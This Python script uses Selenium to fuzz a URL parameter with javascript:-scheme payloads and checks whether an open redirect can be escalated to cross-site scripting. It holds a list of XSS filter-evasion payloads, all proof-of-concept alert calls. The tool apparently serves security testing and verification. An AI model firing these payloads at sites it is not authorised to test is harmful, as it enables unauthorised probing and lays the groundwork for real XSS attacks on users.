import urllib.parse
import argparse
import sys
import time
from typing import List, Dict, Optional, Tuple

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoAlertPresentException, WebDriverException

class OpenRedirectToXSSCheckerSelenium:
    """
    A class to check if an Open Redirect vulnerability can be escalated to an XSS attack
    by injecting a 'javascript:' scheme. Uses Selenium to detect actual JS execution via alerts.
    """

    PAYLOADS: List[str] = [
        "javascript:alert(document.domain)",
        "JaVaScRiPt:alert(document.domain)",
        "javascript://%0Aalert(document.domain)",  # URL-encoded newline
        "javascript://%0Dalert(document.domain)",  # URL-encoded carriage return
        "javascript:/*--></script></title></style><svg/onload=alert(document.domain)>//",
        "\tjavascript:alert(document.domain)",     # Leading tab
        " javascript:alert(document.domain)",      # Leading space
    ]

    PLACEHOLDER: str = "FUZZ"

    def __init__(self, url_template: str, placeholder: str = PLACEHOLDER, driver_path: Optional[str] = None, browser_type: str = 'chrome', headless: bool = False):
        """
        Initializes the checker.

        Args:
            url_template (str): Vulnerable URL template containing a placeholder.
            placeholder (str): Placeholder string to be replaced with payloads.
            driver_path (Optional[str]): Path to the WebDriver executable (e.g. chromedriver).
            browser_type (str): Browser type to use ("chrome" or "firefox").
            headless (bool): Run browser in headless mode or not.
        """
        if placeholder not in url_template:
            raise ValueError(f"Placeholder '{placeholder}' not found in the URL template: {url_template}")

        self.url_template = url_template
        self.placeholder = placeholder
        self.driver_path = driver_path
        self.browser_type = browser_type.lower()
        self.headless = headless

        print(f"[*] Selenium Checker Initialized")
        print(f"    - URL Template: {self.url_template}")
        print(f"    - Placeholder: {self.placeholder}")
        print(f"    - Browser: {self.browser_type}")
        print(f"    - WebDriver Path: {self.driver_path or 'Using PATH'}")
        print(f"    - Headless Mode: {self.headless}")

    def _generate_test_url(self, payload: str) -> str:
        """Replace the placeholder with the encoded payload in the URL template."""
        encoded_payload = urllib.parse.quote(payload)
        return self.url_template.replace(self.placeholder, encoded_payload, 1)

    def _get_webdriver(self) -> Optional[webdriver.Remote]:
        """Initialize and return a WebDriver instance."""
        try:
            if self.browser_type == 'chrome':
                options = webdriver.ChromeOptions()
                if self.headless:
                    options.add_argument('--headless')
                    options.add_argument('--disable-gpu')
                if self.driver_path:
                    service = webdriver.ChromeService(executable_path=self.driver_path)
                    driver = webdriver.Chrome(service=service, options=options)
                else:
                    driver = webdriver.Chrome(options=options)
            elif self.browser_type == 'firefox':
                options = webdriver.FirefoxOptions()
                if self.headless:
                    options.add_argument('--headless')
                if self.driver_path:
                    service = webdriver.FirefoxService(executable_path=self.driver_path)
                    driver = webdriver.Firefox(service=service, options=options)
                else:
                    driver = webdriver.Firefox(options=options)
            else:
                print(f"[!] Unsupported browser type: {self.browser_type}")
                return None
            return driver
        except WebDriverException as e:
            print(f"[!] WebDriver error: {e}")
            print("[!] Make sure the correct WebDriver is installed and the path is valid.")
            return None
        except Exception as e:
            print(f"[!] Unexpected error during WebDriver initialization: {e}")
            return None

    def check_payload_execution(self, payload: str) -> Tuple[bool, str, Optional[str]]:
        """
        Test a single payload to see if an alert is triggered.

        Args:
            payload (str): The javascript: payload to test.

        Returns:
            Tuple of (success, message, tested URL).
        """
        test_url = self._generate_test_url(payload)
        print(f"\n[*] Testing payload: {payload}")
        print(f"    -> URL: {test_url}")

        driver = self._get_webdriver()
        if driver is None:
            return False, "ERROR: WebDriver initialization failed.", test_url

        try:
            print("    Navigating to URL...")
            driver.get(test_url)

            wait_time = 5
            print(f"    Waiting for up to {wait_time} seconds for alert...")
            wait = WebDriverWait(driver, wait_time)
            alert = wait.until(EC.alert_is_present())

            alert_text = alert.text
            print(f"    [+] Alert detected! Text: '{alert_text}'")
            alert.accept()
            return True, f"SUCCESS: Alert with text: '{alert_text}'", test_url

        except TimeoutException:
            print("    [-] No alert detected (timeout).")
            return False, "FAILED: No alert detected.", test_url
        except NoAlertPresentException:
            print("    [-] No alert present.")
            return False, "FAILED: No alert present.", test_url
        except WebDriverException as e:
            print(f"    [!] Selenium error: {e}")
            return False, f"ERROR: Selenium exception - {e}", test_url
        except Exception as e:
            print(f"    [!] Unexpected error: {e}")
            return False, f"ERROR: {e}", test_url
        finally:
            if driver:
                print("    Closing browser...")
                driver.quit()

    def run_all_tests(self) -> List[Tuple[str, str]]:
        """Run all payloads and collect successful ones."""
        print("\n[*] Starting all payload tests...")
        successful_payloads = []

        for payload in self.PAYLOADS:
            is_executed, message, tested_url = self.check_payload_execution(payload)
            print(f"    => {message}")
            if is_executed:
                successful_payloads.append((payload, tested_url))

        print("\n[*] Testing completed.")
        return successful_payloads

# --- Script Entry Point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check if an Open Redirect can be escalated to XSS using Selenium.")
    parser.add_argument("url_template", help="Vulnerable URL template with a placeholder (e.g., 'FUZZ'). Example: 'http://site.com/redirect?next=FUZZ'")
    parser.add_argument("-p", "--placeholder", default=OpenRedirectToXSSCheckerSelenium.PLACEHOLDER, help="Placeholder to replace with payload (default: FUZZ)")
    parser.add_argument("--driver-path", help="Path to the WebDriver executable (e.g., /path/to/chromedriver)")
    parser.add_argument("--browser", default="chrome", choices=['chrome', 'firefox'], help="Browser to use (default: chrome)")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    checker = OpenRedirectToXSSCheckerSelenium(
        url_template=args.url_template,
        placeholder=args.placeholder,
        driver_path=args.driver_path,
        browser_type=args.browser,
        headless=args.headless
    )

    successful_results = checker.run_all_tests()

    if successful_results:
        print("\n[+] Confirmed Open Redirect to XSS execution!")
        print("    The following payloads successfully triggered an alert:")
        for payload, url in successful_results:
            print(f"    - Payload: {payload}")
            print(f"      URL: {url}")
    else:
        print("\n[-] No alerts were triggered using the tested payloads.")
        print("    The vulnerability might be mitigated, or restricted by CSP or other defenses.")

    print("\n[*] Done.")
